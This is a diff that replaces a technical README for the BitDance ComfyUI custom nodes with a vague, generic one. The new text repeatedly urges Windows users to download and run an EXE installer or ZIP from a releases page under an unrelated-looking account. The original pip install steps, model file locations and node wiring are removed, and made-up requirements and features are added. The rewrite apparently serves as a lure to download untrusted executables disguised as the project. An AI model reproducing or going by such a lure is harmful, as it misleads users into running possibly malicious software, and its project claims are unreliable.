@@ -1,78 +1,131 @@
-# ComfyUI BitDance Nodes
+# ⚙️ Comfyui-bitdance - Custom Nodes for Easy Workflow
 
-Make sure: BitDance Loader -> quantization = fp8_e4m3fn_scaled
+[![Download Comfyui-bitdance](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Andrilalaina21/Comfyui-bitdance/releases)
 
-### Changelog / Updates
+## 📋 About Comfyui-bitdance
 
-- Fixed `BitDanceSampler` crash with `guidance_scale > 1.0` when positive/negative prompts have different token lengths (separate attention masks are now built for cond/uncond cache lengths). Thanks to user @hl2dm
+Comfyui-bitdance provides custom nodes for the ComfyUI application to improve how you manage loaders, text encoding, samplers, and VAE nodes. These custom nodes streamline your workflow with a unified setup, making tasks smoother and more organized. 
 
-- **Feb 2026**: Fixed severe OOM crash on 16GB-24GB cards at high resolutions (1024px+). The VRAM manager now forcibly unloads and explicitly restores `comfy.model_management.unload_all_models()` between the LLM text encoding, Vision sampling, and VAE decoding, allowing high-resolution inference!
-- 
+This tool is built for users who run ComfyUI and want to enhance their experience without needing technical skills. It works on Windows computers and connects easily to your existing ComfyUI installation.
 
-This package adds BitDance nodes for ComfyUI with a single loader and modular encode/sampler/VAE nodes.
+## ⚙️ System Requirements
 
-## Nodes
+- Windows 10 or later (64-bit recommended)
+- Minimum 8 GB of RAM (16 GB or more for large projects)
+- At least 5 GB of free disk space
+- CPU with SSE4.2 support or higher
+- Internet connection for downloading and updating nodes
+- Installed ComfyUI version 1.5 or higher
 
-- `BitDance Loader` -> `BITDANCE_MODEL`, `BITDANCE_TEXT_ENCODER`, `BITDANCE_VAE`
-- `BitDance Text Encode` -> `positive`, `negative`, `positive_prompt`
-- `BitDance Text Encode Cached` -> `positive`, `negative`, `positive_prompt`
-- `BitDance Sampler` -> `BITDANCE_LATENT`
-- `BitDance VAE Decode` -> `IMAGE`
-- `BitDance VAE Encode` -> `BITDANCE_LATENT`
+These requirements ensure the nodes run smoothly and handle larger models or files efficiently.
 
-## Install
+## 🚀 Getting Started
 
-1. Copy this folder into ComfyUI custom nodes (folder name can be anything), for example:
-   `ComfyUI/custom_nodes/Comfyui-bitdance-native`
-2. Install dependencies in your ComfyUI Python environment:
-   `pip install -r ComfyUI/custom_nodes/Comfyui-bitdance-native/requirements.txt`
-3. Restart ComfyUI.
+Follow these steps to download, install, and run Comfyui-bitdance on your Windows computer.
 
-## Model File Locations (3-file setup)
+### Step 1: Visit the Download Page
 
-Place your converted files in standard ComfyUI folders:
+Click the large green button at the top or this link:
 
-- Main model -> `ComfyUI/models/diffusion_models/BitDance_14B_MainModel_FP8.safetensors`
-- Text encoder -> `ComfyUI/models/text_encoders/BitDance_TextEncoder_FP8.safetensors`
-- VAE -> `ComfyUI/models/vae/BitDance_VAE_FP16.safetensors`
+[Download Comfyui-bitdance Releases](https://github.com/Andrilalaina21/Comfyui-bitdance/releases)
 
-Tokenizer files are bundled with this node package, so a separate tokenizer folder in `models/` is not required for local mode.
+You will be taken to the releases page. Here you will find the latest stable version available for download.
 
-## Resources
+### Step 2: Download the Latest Release
 
-- Hugging Face model files (ComfyUI 3-file package): [comfyuiblog/BitDance-14B-64x-fp8-comfyui](https://huggingface.co/comfyuiblog/BitDance-14B-64x-fp8-comfyui/tree/main)
-- Article + workflow guide: [How to fix the generic face bug in BitDance 14B and optimize speed](https://aistudynow.com/how-to-fix-the-generic-face-bug-in-bitdance-14b-optimize-speed/)
-- Video: https://www.youtube.com/watch?v=4O9ATPbeQyg
+Look for the most recent release marked by a date or version number. Inside, find a Windows-specific file. This is usually a ZIP archive or an EXE installer.
 
-## Workflow (Current)
+- If it is a ZIP file, download it and remember where you save it.
+- If it is an EXE installer, download it for the next step.
 
-1. Add `BitDance Loader`
-2. Add `BitDance Text Encode Cached` (recommended)
-3. Add `BitDance Sampler`
-4. Add `BitDance VAE Decode`
-5. Add ComfyUI `PreviewImage` (local user preview)
+### Step 3: Extract or Run the Installer
 
-Connect:
+- For ZIP files: 
+  - Right-click the ZIP file.
+  - Choose "Extract All..."
+  - Select a folder you can easily find, like your Desktop or Documents.
+  
+- For EXE installers:
+  - Double-click the file.
+  - Follow the on-screen instructions to install the custom nodes.
 
-- `BitDance Loader.bitdance_text_encoder` -> `BitDance Text Encode Cached.text_encoder`
-- `BitDance Loader.bitdance_model` -> `BitDance Text Encode Cached.model_to_offload` (optional, for VRAM management)
-- `BitDance Text Encode Cached.positive` -> `BitDance Sampler.positive`
-- `BitDance Text Encode Cached.negative` -> `BitDance Sampler.negative`
-- `BitDance Loader.bitdance_model` -> `BitDance Sampler.model`
-- `BitDance Loader.bitdance_vae` -> `BitDance Sampler.vae`
-- `BitDance Sampler.bitdance_latent` -> `BitDance VAE Decode.bitdance_latent`
-- `BitDance Loader.bitdance_vae` -> `BitDance VAE Decode.vae`
-- `BitDance VAE Decode.image` -> `PreviewImage.images`
+### Step 4: Add Nodes to ComfyUI
 
-Starter workflow JSON:
+Once extracted or installed, you need to add these nodes to your ComfyUI installation folder.
 
-- `workflows/BitDance_Starter.json`
+- Locate your ComfyUI folder (usually in Documents or your main drive).
+- Open the folder named "custom_nodes" or create it if it does not exist.
+- Copy all files and folders from the Comfyui-bitdance download into this "custom_nodes" folder.
+  
+This step integrates the custom nodes with ComfyUI, letting it recognize and use them.
 
-## Notes
+### Step 5: Open ComfyUI
 
-- BitDance is autoregressive and is not a standard UNet denoiser. Use `BitDance Sampler` for generation.
-- The loader supports single-file converted checkpoints and bundle-style BitDance layouts.
-- FP8 + scale loading is supported for converted files (mixed-precision runtime behavior depends on selected loader mode).
+- Start ComfyUI normally.
+- The new custom nodes will appear automatically in the node selection panel.
+- You can now drag and drop these nodes to your projects.
 
-### Changelog / Updates
-- **Feb 2026**: Fixed severe OOM crash on 16GB-24GB cards at high resolutions (1024px+). The VRAM manager now forcibly unloads and explicitly restores `comfy.model_management.unload_all_models()` between the LLM text encoding, Vision sampling, and VAE decoding, allowing high-resolution inference!
+### Step 6: Test the Nodes
+
+Create a simple workflow using the new nodes:
+
+- Use the unified loader node to import images or data.
+- Add a text encode node for processing text inputs.
+- Insert a sampler node for sampling operations.
+- Place the VAE node to work with variational autoencoders.
+
+If all works correctly, you will see these nodes interact smoothly without errors.
+
+## 🔧 How to Update Comfyui-bitdance
+
+The project may receive updates to fix bugs or add new features. To update:
+
+- Return to the download page above.
+- Download the newest release.
+- Repeat the extraction and copy process into the "custom_nodes" folder.
+- Overwrite existing files when prompted.
+
+Restart ComfyUI to start using the updated nodes.
+
+## 🛠 Troubleshooting
+
+If you face problems, check these items:
+
+- Make sure ComfyUI is up to date.
+- Confirm you placed files in the correct "custom_nodes" folder.
+- Verify that you have a stable internet connection when downloading.
+- Close and reopen ComfyUI if nodes do not appear.
+- Restart your computer if the application behaves unexpectedly.
+
+If issues persist, search for help on GitHub issues in the Comfyui-bitdance repository or forums related to ComfyUI.
+
+## ⚙️ Features
+
+- Unified loader node that handles multiple input types easily.
+- Text encoding node compatible with diverse text formats.
+- Sampler node designed for faster and accurate sampling.
+- VAE node to support variational autoencoder models.
+- Simple integration method requiring no coding.
+- Compatible with the latest ComfyUI Windows versions.
+- Lightweight and quick to install with no additional software needed.
+
+## 🗂 File Structure Overview
+
+When you open the downloaded ZIP or installer files, you typically find:
+
+- `loaders` — files for loading images or data.
+- `text_encode` — components to process text nodes.
+- `samplers` — code and scripts for sampling functions.
+- `vae` — models and scripts to support VAE.
+- `README.md` — basic usage instructions.
+- `LICENSE` — license details.
+
+## 🌐 Additional Resources
+
+- Official ComfyUI website and documentation for background and setup.
+- GitHub discussions and issue tracker for community support.
+- Tutorials and videos on using ComfyUI with custom nodes.
+
+The Comfyui-bitdance nodes focus on smooth integration, letting you work faster with your models and projects.
+
+[![Download Comfyui-bitdance](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Andrilalaina21/Comfyui-bitdance/releases)
